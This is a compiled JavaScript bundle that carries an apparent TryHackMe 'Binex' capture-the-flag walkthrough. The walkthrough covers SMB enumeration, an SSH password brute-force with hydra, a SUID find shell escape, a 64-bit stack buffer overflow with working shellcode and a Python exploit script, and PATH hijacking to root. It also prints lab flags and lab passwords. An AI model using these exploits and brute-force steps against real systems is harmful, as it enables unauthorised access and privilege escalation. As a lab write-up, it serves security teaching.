"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[3412],{3905:(e,n,t)=>{t.d(n,{Zo:()=>u,kt:()=>f});var r=t(67294);function a(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function o(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function i(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?o(Object(t),!0).forEach((function(n){a(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function s(e,n){if(null==e)return{};var t,r,a=function(e,n){if(null==e)return{};var t,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)t=o[r],n.indexOf(t)>=0||(a[t]=e[t]);return a}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)t=o[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(a[t]=e[t])}return a}var l=r.createContext({}),p=function(e){var n=r.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):i(i({},n),e)),t},u=function(e){var n=p(e.components);return r.createElement(l.Provider,{value:n},e.children)},d="mdxType",c={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},m=r.forwardRef((function(e,n){var t=e.components,a=e.mdxType,o=e.originalType,l=e.parentName,u=s(e,["components","mdxType","originalType","parentName"]),d=p(t),m=a,f=d["".concat(l,".").concat(m)]||d[m]||c[m]||o;return t?r.createElement(f,i(i({ref:n},u),{},{components:t})):r.createElement(f,i({ref:n},u))}));function f(e,n){var t=arguments,a=n&&n.mdxType;if("string"==typeof e||a){var o=t.length,i=new Array(o);i[0]=m;var s={};for(var l in n)hasOwnProperty.call(n,l)&&(s[l]=n[l]);s.originalType=e,s[d]="string"==typeof e?e:a,i[1]=s;for(var p=2;p<o;p++)i[p]=t[p];return r.createElement.apply(null,i)}return r.createElement.apply(null,t)}m.displayName="MDXCreateElement"},71423:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>i,default:()=>c,frontMatter:()=>o,metadata:()=>s,toc:()=>p});var r=t(87462),a=(t(67294),t(3905));const o={},i="Binex",s={unversionedId:"Tryhackme/Binex/Binex",id:"Tryhackme/Binex/Binex",title:"Binex",description:"Escalate your privileges by exploiting vulnerable binaries.",source:"@site/writeups/Tryhackme/Binex/Binex.md",sourceDirName:"Tryhackme/Binex",slug:"/Tryhackme/Binex/",permalink:"/writeups/Tryhackme/Binex/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Basic Pentesting",permalink:"/writeups/Tryhackme/BasicPentesting/Basic Pentesting"},next:{title:"Biohazard",permalink:"/writeups/Tryhackme/Biohazard/"}},l={},p=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Gain initial access",id:"task-1-gain-initial-access",level:2},{value:"Task 2 SUID :: Binary 1",id:"task-2-suid--binary-1",level:2},{value:"Task 3 Buffer Overflow :: Binary 2",id:"task-3-buffer-overflow--binary-2",level:2},{value:"Task 4 PATH Manipulation :: Binary 3",id:"task-4-path-manipulation--binary-3",level:2}],u={toc:p},d="wrapper";function c(e){let{components:n,...t}=e;return(0,a.kt)(d,(0,r.Z)({},u,t,{components:n,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"binex"},"Binex"),(0,a.kt)("p",null,"Escalate your privileges by exploiting vulnerable binaries."),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/binex"},"Binex")),(0,a.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Linux Enumeration"),(0,a.kt)("li",{parentName:"ul"},"SMB Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Brute Forcing (SSH)"),(0,a.kt)("li",{parentName:"ul"},"Abusing SUID/GUID"),(0,a.kt)("li",{parentName:"ul"},"Buffer Overflow"),(0,a.kt)("li",{parentName:"ul"},"Exploiting PATH Variable")),(0,a.kt)("hr",null),(0,a.kt)("h2",{id:"task-1-gain-initial-access"},"Task 1 Gain initial access"),(0,a.kt)("p",null,"Enumerate the machine and get an interactive shell. Exploit an SUID bit file, use GNU debugger to take advantage of a buffer overflow and gain root access by PATH manipulation."),(0,a.kt)("p",null,"There are more points up for grabs in this room."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Binex$ sudo nmap -p- -Pn -sS -sC -sV -O 10.10.45.117\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-12 17:41 CEST\nNmap scan report for 10.10.45.117\nHost is up (0.037s latency).\nNot shown: 65532 closed ports\nPORT    STATE SERVICE     VERSION\n22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 3f:36:de:da:2f:c3:b7:78:6f:a9:25:d6:41:dd:54:69 (RSA)\n|   256 d0:78:23:ee:f3:71:58:ae:e9:57:14:17:bb:e3:6a:ae (ECDSA)\n|_  256 4c:de:f1:49:df:21:4f:32:ca:e6:8e:bc:6a:96:53:e5 (ED25519)\n139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/12%OT=22%CT=1%CU=40819%PV=Y%DS=2%DC=I%G=Y%TM=5F847A\nOS:BB%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=104%TI=Z%CI=Z%II=I%TS=A)SE\nOS:Q(SP=101%GCD=1%ISR=105%TI=Z%CI=Z%TS=A)OPS(O1=M508ST11NW7%O2=M508ST11NW7%\nOS:O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=F4B3%W2\nOS:=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNS\nOS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%\nOS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%\nOS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%\nOS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%\nOS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: Host: THM_EXPLOIT; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_nbstat: NetBIOS name: THM_EXPLOIT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)\n| smb-os-discovery:\n|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)\n|   Computer name: thm_exploit\n|   NetBIOS computer name: THM_EXPLOIT\\x00\n|   Domain name: \\x00\n|   FQDN: thm_exploit\n|_  System time: 2020-10-12T15:48:09+00:00\n| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode:\n|   2.02:\n|_    Message signing enabled but not required\n| smb2-time:\n|   date: 2020-10-12T15:48:09\n|_  start_date: N/A\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 428.31 seconds\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Binex$ enum4linux -a 10.10.45.117\nStarting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Oct 12 17:48:37 2020\n\n ==========================\n|    Target Information    |\n ==========================\nTarget ........... 10.10.45.117\nRID Range ........ 500-550,1000-1050\nUsername ......... ''\nPassword ......... ''\nKnown Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none\n\n\n ====================================================\n|    Enumerating Workgroup/Domain on 10.10.45.117    |\n ====================================================\n[+] Got domain/workgroup name: WORKGROUP\n\n ============================================\n|    Nbtstat Information for 10.10.45.117    |\n ============================================\nLooking up status of 10.10.45.117\n        THM_EXPLOIT     <00> -         B <ACTIVE>  Workstation Service\n        THM_EXPLOIT     <03> -         B <ACTIVE>  Messenger Service\n        THM_EXPLOIT     <20> -         B <ACTIVE>  File Server Service\n        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser\n        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name\n        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser\n        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections\n\n        MAC Address = 00-00-00-00-00-00\n\n =====================================\n|    Session Check on 10.10.45.117    |\n =====================================\n[+] Server 10.10.45.117 allows sessions using username '', password ''\n\n ===========================================\n|    Getting domain SID for 10.10.45.117    |\n ===========================================\nDomain Name: WORKGROUP\nDomain Sid: (NULL SID)\n[+] Can't determine if host is part of domain or part of a workgroup\n\n ======================================\n|    OS information on 10.10.45.117    |\n ======================================\nUse of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.\n[+] Got OS info for 10.10.45.117 from smbclient:\n[+] Got OS info for 10.10.45.117 from srvinfo:\n        THM_EXPLOIT    Wk Sv PrQ Unx NT SNT THM_exploit server (Samba, Ubuntu)\n        platform_id     :       500\n        os version      :       6.1\n        server type     :       0x809a03\n\n =============================\n|    Users on 10.10.45.117    |\n =============================\nUse of uninitialized value $users in print at ./enum4linux.pl line 874.\nUse of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.\n\nUse of uninitialized value $users in print at ./enum4linux.pl line 888.\nUse of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.\n\n =========================================\n|    Share Enumeration on 10.10.45.117    |\n =========================================\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        print$          Disk      Printer Drivers\n        IPC$            IPC       IPC Service (THM_exploit server (Samba, Ubuntu))\nSMB1 disabled -- no workgroup available\n\n[+] Attempting to map shares on 10.10.45.117\n//10.10.45.117/print$   Mapping: DENIED, Listing: N/A\n//10.10.45.117/IPC$     [E] Can't understand response:\nNT_STATUS_OBJECT_NAME_NOT_FOUND listing \\*\n\n ====================================================\n|    Password Policy Information for 10.10.45.117    |\n ====================================================\n[E] Unexpected error from polenum:\n\n\n[+] Attaching to 10.10.45.117 using a NULL share\n\n[+] Trying protocol 139/SMB...\n\n        [!] Protocol failed: Missing required parameter 'digestmod'.\n\n[+] Trying protocol 445/SMB...\n\n        [!] Protocol failed: Missing required parameter 'digestmod'.\n\n\n[+] Retieved partial password policy with rpcclient:\n\nPassword Complexity: Disabled\nMinimum Password Length: 5\n\n =======================================================================\n|    Users on 10.10.45.117 via RID cycling (RIDS: 500-550,1000-1050)    |\n =======================================================================\n[I] Found new SID: S-1-22-1\n[I] Found new SID: S-1-5-21-2007993849-1719925537-2372789573\n[I] Found new SID: S-1-5-32\n[+] Enumerating users using SID S-1-5-32 and logon username '', password ''\nS-1-5-32-544 BUILTIN\\Administrators (Local Group)\nS-1-5-32-545 BUILTIN\\Users (Local Group)\nS-1-5-32-546 BUILTIN\\Guests (Local Group)\nS-1-5-32-547 BUILTIN\\Power Users (Local Group)\nS-1-5-32-548 BUILTIN\\Account Operators (Local Group)\nS-1-5-32-549 BUILTIN\\Server Operators (Local Group)\nS-1-5-32-550 BUILTIN\\Print Operators (Local Group)\n[+] Enumerating users using SID S-1-5-21-2007993849-1719925537-2372789573 and logon username '', password ''\nS-1-5-21-2007993849-1719925537-2372789573-501 THM_EXPLOIT\\nobody (Local User)\nS-1-5-21-2007993849-1719925537-2372789573-513 THM_EXPLOIT\\None (Domain Group)\n[+] Enumerating users using SID S-1-22-1 and logon username '', password ''\nS-1-22-1-1000 Unix User\\kel (Local User)\nS-1-22-1-1001 Unix User\\des (Local User)\nS-1-22-1-1002 Unix User\\tryhackme (Local User)\nS-1-22-1-1003 Unix User\\noentry (Local User)\nenum4linux complete on Mon Oct 12 17:53:18 2020\n")),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"kel"),(0,a.kt)("li",{parentName:"ul"},"des"),(0,a.kt)("li",{parentName:"ul"},"tryhackme"),(0,a.kt)("li",{parentName:"ul"},"noentry")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Binex$ smbclient -L 10.10.45.117 -U anomymous\nEnter WORKGROUP\\anomymous's password:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        print$          Disk      Printer Drivers\n        IPC$            IPC       IPC Service (THM_exploit server (Samba, Ubuntu))\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Binex$ hydra -l tryhackme -P /usr/share/wordlists/rockyou.txt ssh://10.10.45.117\nHydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-12 17:55:38\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task\n[DATA] attacking ssh://10.10.45.117:22/\n[STATUS] 178.00 tries/min, 178 tries in 00:01h, 14344223 to do in 1343:06h, 16 active\n[STATUS] 134.33 tries/min, 403 tries in 00:03h, 14343998 to do in 1779:40h, 16 active\n[STATUS] 116.86 tries/min, 818 tries in 00:07h, 14343583 to do in 2045:45h, 16 active\n[22][ssh] host: 10.10.45.117   login: tryhackme   password: thebest\n1 of 1 target successfully completed, 1 valid password found\n[WARNING] Writing restore file because 3 final worker threads did not complete until end.\n[ERROR] 3 targets did not resolve or could not be connected\n[ERROR] 0 targets did not complete\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-12 18:03:00\n")),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"What are the login credential for initial access. Answer format should be in username:password")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"tryhackme:thebest")),(0,a.kt)("h2",{id:"task-2-suid--binary-1"},"Task 2 SUID :: Binary 1"),(0,a.kt)("p",null,"Read the flag.txt from des's home directory."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"tryhackme@THM_exploit:~$ find / -type f -perm -u=s -user des -ls 2> /dev/null\n   262721    236 -rwsr-sr-x   1 des      des        238080 Nov  5  2017 /usr/bin/find\ntryhackme@THM_exploit:~$ ls -la /usr/bin/find\n-rwsr-sr-x 1 des des 238080 Nov  5  2017 /usr/bin/find\n")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://gtfobins.github.io/gtfobins/find/"},"https://gtfobins.github.io/gtfobins/find/")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"tryhackme@THM_exploit:~$ find . -exec /bin/bash -p \\; -quit\nbash-4.4$ whoami\ndes\nbash-4.4$ cd /home/des/\nbash-4.4$ ls -la\ntotal 52\ndrwx------ 4 des  des  4096 Jan 17  2020 .\ndrwxr-xr-x 6 root root 4096 Jan 17  2020 ..\n-rw------- 1 root root 1740 Jan 12  2020 .bash_history\n-rw-r--r-- 1 des  des   220 Apr  4  2018 .bash_logout\n-rw-r--r-- 1 des  des  3771 Apr  4  2018 .bashrc\n-rwsr-xr-x 1 kel  kel  8600 Jan 17  2020 bof\n-rw-r--r-- 1 root root  335 Jan 17  2020 bof64.c\ndrwx------ 2 des  des  4096 Jan 12  2020 .cache\n-r-x------ 1 des  des   237 Jan 17  2020 flag.txt\ndrwx------ 3 des  des  4096 Jan 12  2020 .gnupg\n-rw-r--r-- 1 des  des   807 Apr  4  2018 .profile\nbash-4.4$ cat flag.txt\nGood job on exploiting the SUID file. Never assign +s to any system executable files. Remember, Check gtfobins.\n\nYou flag is THM{exploit_the_SUID}\n\nlogin crdential (In case you need it)\nusername: des\npassword: destructive_72656275696c64\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"username: des password: destructive_72656275696c64")),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"What is the contents of /home/des/flag.txt?")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"THM{exploit_the_SUID}")),(0,a.kt)("h2",{id:"task-3-buffer-overflow--binary-2"},"Task 3 Buffer Overflow :: Binary 2"),(0,a.kt)("p",null,"Read the flag.txt from kel's home directory."),(0,a.kt)("p",null,"If you are stuck, here are the hints for the exploit."),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Hint 1"),": Step to overflow 64-bits buffer",(0,a.kt)("ul",{parentName:"li"},(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Step 1"),": Generate a pattern, copy and paste this as input to the binary (use pattern_create.rb from Metasploit)"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Step 2"),": Read and copy the value from register RBP for the offset."),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Step 3"),": Calculate the offset. (use pattern_offset.rb from Metasploit)"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Step 4"),": Try control the register RIP with the following payload Junk","*","(offset value) + 8 bytes of dummy"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Step 5"),": Read the stack or register RSP to find a suitable return address."),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Step 6"),": The general payload should be like below Nop + shellcode + Junks + return address"))),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Hint 2"),": Working shellcode ",(0,a.kt)("inlineCode",{parentName:"li"},"\\x50\\x48\\x31\\xd2\\x48\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x54\\x5f\\xb0\\x3b\\x0f\\x05")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Hint 3"),": Running the payload with the binary ",(0,a.kt)("inlineCode",{parentName:"li"},"(python -c \"print('\\x90'*(fill in the number) + (shellcode) + 'A'*(fill in the number) +(return address))\";cat) | ./bof64"))),(0,a.kt)("p",null,"For your information, the Gnu debugger or gdb is installed with the machine. Happy hunting!"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"des@THM_exploit:~$ ./bof\nEnter some string:\ntest\nYou entered: test\ndes@THM_exploit:~$ file bof\nbof: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=4a53f62986d7ff151cb42f0bdf26ce36c28ca5dd, not stripped\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Binex$ cat bof64.c\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-c"},'#include <stdio.h>\n#include <unistd.h>\n\nint foo(){\n        char buffer[600];\n        int characters_read;\n        printf("Enter some string:\\n");\n        characters_read = read(0, buffer, 1000);\n        printf("You entered: %s", buffer);\n        return 0;\n}\n\nvoid main(){\n        setresuid(geteuid(), geteuid(), geteuid());\n        setresgid(getegid(), getegid(), getegid());\n\n        foo();\n}\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"des@THM_exploit:~$ echo $(python -c 'print(\"A\" * 650)') | ./bof\nEnter some string:\nSegmentation fault (core dumped)\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-py"},'from struct import pack\n#buf="\\xcc"*8\nbuf="\\x50\\x48\\x31\\xd2\\x48\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x54\\x5f\\xb0\\x3b\\x0f\\x05"\npayload="\\x90"*400\npayload += buf\npayload += "A" * (208 -len(buf))\npayload += "B" *8\npayload += pack("<Q", 0x7fffffffe300)\n\nprint payload\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"des@THM_exploit:~$ python exploit.py >testdes@THM_exploit:~$ (cat test;cat) | ./bof Enter some string:\nid\nuid=1000(kel) gid=1001(des) groups=1001(des)\npwd\n/home/des\ncd /home/kel\nls -la\ntotal 52\ndrwx------ 4 kel  kel  4096 Jan 17  2020 .\ndrwxr-xr-x 6 root root 4096 Jan 17  2020 ..\n-rw------- 1 root root   16 Jan 12  2020 .bash_history\n-rw-r--r-- 1 kel  kel   220 Apr  4  2018 .bash_logout\n-rw-r--r-- 1 kel  kel  3771 Apr  4  2018 .bashrc\ndrwx------ 2 kel  kel  4096 Jan 12  2020 .cache\ndrwx------ 3 kel  kel  4096 Jan 12  2020 .gnupg\n-rw-r--r-- 1 kel  kel   807 Apr  4  2018 .profile\n-rwsr-xr-x 1 root root 8392 Jan 17  2020 exe\n-rw-r--r-- 1 root root   76 Jan 17  2020 exe.c\n-rw------- 1 kel  kel   118 Jan 17  2020 flag.txt\ncat flag.txt\nYou flag is THM{buffer_overflow_in_64_bit}\n\nThe user credential\nusername: kel\npassword: kelvin_74656d7065726174757265\n")),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"What is the contents of /home/kel/flag.txt?")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"THM{buffer_overflow_in_64_bit}")),(0,a.kt)("h2",{id:"task-4-path-manipulation--binary-3"},"Task 4 PATH Manipulation :: Binary 3"),(0,a.kt)("p",null,"Get the root flag from the root directory. This will require you to understand how the PATH variable works."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'cd /tmp\nls\nsystemd-private-0f779aad101b42e0b596cddf443aa30f-systemd-resolved.service-qGxTHc  systemd-private-0f779aad101b42e0b596cddf443aa30f-systemd-timesyncd.service-Aj3keJ\necho "/bin/bash" > ps\nchmod +x ps\nexport PATH=/tmp:$PATH\ncd /home/kel\n./exe\nid\nuid=0(root) gid=0(root) groups=0(root),1001(des)\ncat /root/root.txt\nThe flag: THM{SUID_binary_and_PATH_exploit}.\nAlso, thank you for your participation.\n\nThe room is built with love. DesKel out.\n')),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"What is the contents of /root/root.txt?")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"THM{SUID_binary_and_PATH_exploit}")))}c.isMDXComponent=!0}}]);